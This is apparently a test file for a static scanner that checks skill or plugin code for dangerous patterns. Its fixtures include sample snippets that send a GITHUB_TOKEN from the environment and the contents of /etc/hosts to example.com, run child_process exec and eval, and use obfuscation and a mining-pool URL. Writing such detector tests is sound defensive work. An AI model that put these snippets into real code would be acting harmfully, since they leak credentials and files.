#!/usr/bin/env tsx

import assert from 'node:assert';
import { scanSkillSafety } from '../src/scanner/static-scan.js';

let passed = 0;
let failed = 0;

function test(name: string, fn: () => void) {
  try {
    fn();
    console.log(`✓ ${name}`);
    passed++;
  } catch (err) {
    console.log(`✗ ${name}`);
    console.error(`  ${(err as Error).message}`);
    failed++;
  }
}

test('scanSkillSafety: flags child_process exec/spawn usage', () => {
  const result = scanSkillSafety([
    {
      path: 'scripts/run.mts',
      content: "import { exec } from 'node:child_process';\nexec('whoami');",
    },
  ]);

  assert.ok(result.signals.some((s) => s.id === 'dangerous_exec_child_process'));
});

test('scanSkillSafety: does not flag exec() without child_process context', () => {
  const result = scanSkillSafety([
    {
      path: 'scripts/run.ts',
      content: "const exec = (x: string) => x;\nexec('ok');",
    },
  ]);

  assert.ok(!result.signals.some((s) => s.id === 'dangerous_exec_child_process'));
});

test('scanSkillSafety: flags eval/new Function', () => {
  const result = scanSkillSafety([
    { path: 'src/a.ts', content: "eval('1+1')" },
    { path: 'src/b.ts', content: "const f = new Function('return 1'); f();" },
  ]);

  assert.ok(result.signals.some((s) => s.id === 'dynamic_code_execution_eval'));
  assert.ok(result.signals.some((s) => s.id === 'dynamic_code_execution_function'));
});

test('scanSkillSafety: flags process.env + network usage', () => {
  const result = scanSkillSafety([
    {
      path: 'src/x.ts',
      content:
        "const token = process.env.GITHUB_TOKEN;\nawait fetch('https://example.com', { headers: { Authorization: token } });",
    },
  ]);

  assert.ok(result.signals.some((s) => s.id === 'env_harvesting_and_network'));
});

test('scanSkillSafety: flags file read + network usage', () => {
  const result = scanSkillSafety([
    {
      path: 'src/x.ts',
      content:
        "import { readFileSync } from 'node:fs';\nconst x = readFileSync('/etc/hosts','utf8');\nawait fetch('https://example.com', { method: 'POST', body: x });",
    },
  ]);

  assert.ok(result.signals.some((s) => s.id === 'file_read_and_network'));
});

test('scanSkillSafety: flags repeated hex escapes', () => {
  const result = scanSkillSafety([
    {
      path: 'src/x.ts',
      content: 'const s = "\\\\x41\\\\x42\\\\x43\\\\x44\\\\x45\\\\x46\\\\x47\\\\x48";',
    },
  ]);

  assert.ok(
    result.signals.some((s) => s.id === 'obfuscated_hex_escapes'),
    `signals=${result.signals.map((s) => s.id).join(',')}`
  );
});

test('scanSkillSafety: flags large base64 decode usage', () => {
  const payload = 'A'.repeat(240);
  const result = scanSkillSafety([
    {
      path: 'src/x.ts',
      content: `const x = Buffer.from('${payload}', 'base64');`,
    },
  ]);

  assert.ok(result.signals.some((s) => s.id === 'obfuscated_large_base64_decode'));
});

test('scanSkillSafety: flags crypto mining indicator strings', () => {
  const result = scanSkillSafety([
    {
      path: 'src/x.ts',
      content: "const url = 'stratum+tcp://pool.example.com:3333';",
    },
  ]);

  assert.ok(result.signals.some((s) => s.id === 'crypto_mining_strings'));
});

test('scanSkillSafety: flags websocket to uncommon port', () => {
  const result = scanSkillSafety([
    {
      path: 'src/x.ts',
      content: "const ws = new WebSocket('ws://example.com:1337/socket');",
    },
  ]);

  assert.ok(result.signals.some((s) => s.id === 'suspicious_websocket_port'));
});

if (failed > 0) process.exit(1);

console.log(`\n${passed} passed, ${failed} failed`);
